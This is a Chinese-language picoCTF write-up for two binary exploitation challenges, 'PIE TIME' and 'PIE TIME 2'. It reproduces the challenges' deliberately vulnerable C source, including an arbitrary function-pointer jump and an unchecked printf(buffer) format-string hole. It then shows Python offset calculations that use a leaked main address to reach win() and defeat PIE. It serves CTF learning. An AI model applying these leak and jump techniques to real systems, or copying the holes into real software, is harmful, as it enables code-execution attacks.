---
title: PIE TIME &  PIE TIME 2
published: 2025-07-11
updated: 2025-07-12
description: "picoCTF"
image: ""
tags: ["CTF Writeup", "picoCTF", "pwnable"]
category: "picoCTF"
draft: false
---

# PIE TIME

這一題可以知道 main 的 address

```c
int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main);

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```

所以先去得到 main 的 offset 跟 win 的 offset

![objdump](/assets/picoCTF/PIE_TIME/image.png)

可以由 `main address - main offset + win offset` 推算出 win 的 address

所以在正式環境把 main address - (0x133d - 0x12a7) 就可以得出 win addrress

```python
main = 0x5c84c7ebc33d
offset_main = 0x133d
offset_win = 0x12a7

base = main - offset_main
win = base + offset_win
print(hex(win)) # 0x5c84c7ebc2a7
```

![flag](/assets/picoCTF/PIE_TIME/image-1.png)

---

# PIE TIME 2

這一題沒有給 main 的 address 了，但是 `printf(buffer);` 如果輸入`%p` 就可以讀出 stack 上的值

```c
void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);

  unsigned long val;
  printf(" enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);

  void (*foo)(void) = (void (*)())val;
  foo();
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  call_functions();
  return 0;
}
```

main 與 win 的相對位置是固定的

![objdump](/assets/picoCTF/PIE_TIME/image-2.png)

stack 上還存著程式執行完 call_functions 後會跳回的 main 函數位址

main 的位址是 `0x0000555555555400`

![main](/assets/picoCTF/PIE_TIME/image-3.png)

![rsp](/assets/picoCTF/PIE_TIME/image-6.png)

嘗試之後好像第 25 個 %p 印出來的值，正好是 main 的位址，nc 過去試試看

```python
MAIN_OFFSET = 0x1400
WIN_OFFSET = 0x136a

offset = MAIN_OFFSET - WIN_OFFSET

print(hex(offset))

leak = 0x6163f4169400

print(hex(leak - offset))
```

![alt text](/assets/picoCTF/PIE_TIME/image-5.png)

![flag](/assets/picoCTF/PIE_TIME/image-4.png)

我覺得這類型的題目還不是很熟，常常都算不好 (╥﹏╥)

---

100 題 Medium 了嘻嘻

![picoCTF](/assets/picoCTF/PIE_TIME/image-7.png)
